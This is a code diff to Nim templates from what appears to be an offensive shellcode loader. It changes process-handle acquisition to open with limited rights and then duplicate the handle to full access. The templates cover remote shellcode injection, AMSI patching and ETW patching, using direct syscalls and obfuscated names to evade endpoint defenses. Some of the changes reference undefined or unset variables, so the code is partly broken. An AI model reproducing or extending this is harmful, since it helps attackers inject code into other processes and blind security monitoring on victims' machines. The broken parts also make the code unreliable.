@@ -11,10 +11,17 @@ let ShellcodeRemoteInjectMapSection * = """
 
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
-
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+                
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                var highPrivHandle: HANDLE
+                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), workedfine
+                tProcess = highPrivHandle
+                
 
             when defined(AllocateDripStyle):
                 lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
@@ -96,9 +103,22 @@ let ShellcodeRemoteInjectMapSection * = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
             
             when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
-                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var highPrivHandle: HANDLE
+                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), status
+                tProcess = highPrivHandle
         
 
             when defined(AllocateDripStyle):
@@ -244,10 +264,17 @@ let ShellcoderemoteinjectStub * = """
         
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
 
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                var highPrivHandle: HANDLE
+                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), workedfine
+                tProcess = highPrivHandle
             
 
             when defined(AllocateDripStyle):
@@ -336,9 +363,22 @@ let ShellcoderemoteinjectStub * = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
         
             when not defined(spawninject):
-                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), status
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var highPrivHandle: HANDLE
+                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
+                tProcess = highPrivHandle
         
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -1155,11 +1195,33 @@ let RemotePatchAMSIStub* = """
                 cid2.UniqueProcess = processID
                 var statusamsi = NtOpenProcess(
                     &hProcss,
-                    PROCESS_ALL_ACCESS, 
+                    PROCESS_QUERY_INFORMATION, 
                     &oa2, &cid2         
                 )
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(statusamsi)
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+
+                # duplicate to get PROCESS_ALL_ACCESS
+                var high: HANDLE
+                status = NtDuplicateObject(
+                    -1, 
+                    hProcss, 
+                    -1, 
+                    &high, 
+                    PROCESS_ALL_ACCESS, 
+                    FALSE, 
+                    0
+                )
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(workedfine)
+                hProcss = high
         
         when not defined(spawninject):
             var procHandle2: HANDLE = hProcss
@@ -1461,10 +1523,26 @@ let RemoteLoadAMSIStub* = """
 
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
 
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate to get PROCESS_ALL_ACCESS
+                var high: HANDLE
+                let workedfine = DuplicateHandle(
+                    -1, 
+                    tProcess, 
+                    -1, 
+                    &high, 
+                    PROCESS_ALL_ACCESS, 
+                    FALSE, 
+                    0
+                )
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), toHex(workedfine)
+                tProcess = high
+
 
             status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
@@ -1495,9 +1573,31 @@ let RemoteLoadAMSIStub* = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
 
             when not defined(spawninject):
-                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate to get PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var high: HANDLE
+                status = NtDuplicateObject(
+                    -1, 
+                    tProcess, 
+                    -1, 
+                    &high, 
+                    PROCESS_ALL_ACCESS, 
+                    FALSE, 
+                    0
+                )
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
+                tProcess = high
+
 
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -1715,12 +1815,18 @@ let RemotePatchETWStub* = """
         var cid: CLIENT_ID
         when not defined(spawninject):
             var hProcssetw: HANDLE
+            var hProcHighPriv: HANDLE
         var status: NTSTATUS
         cid.UniqueProcess = remoteProcID
         var oa: OBJECT_ATTRIBUTES
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = opqiwepoausdasdjl(&hProcss,PROCESS_QUERY_INFORMATION,&oa, &cid)
+
+                # now use DuplicateHandle to elevate this to PROCESS_ALL_ACCESS
+                DuplicateHandle(-1, hProcss, -1, &hProcHighPriv, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), toHex(status)
         else:
             when defined(Hellsgate):
                 if getSyscall(ntOpenTable):
@@ -1732,16 +1838,27 @@ let RemotePatchETWStub* = """
             when not defined(spawninject):
                 status = NtOpenProcess(
                     &hProcssetw,
-                    PROCESS_ALL_ACCESS, 
+                    PROCESS_QUERY_INFORMATION, 
                     &oa, &cid         
                 )
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # now use DuplicateHandle to elevate this to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                status = NtDuplicateObject(-1, hProcssetw, -1, &hProcHighPriv, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
         
         when not defined(spawninject):
-            var procHandle: HANDLE = hProcssetw
+            var procHandle: HANDLE = hProcHighPriv
         else:
-            var procHandle: HANDLE = tProcess
+            var procHandle: HANDLE = hProcHighPriv
 
         success = RemotePatchETW(procHandle)
         
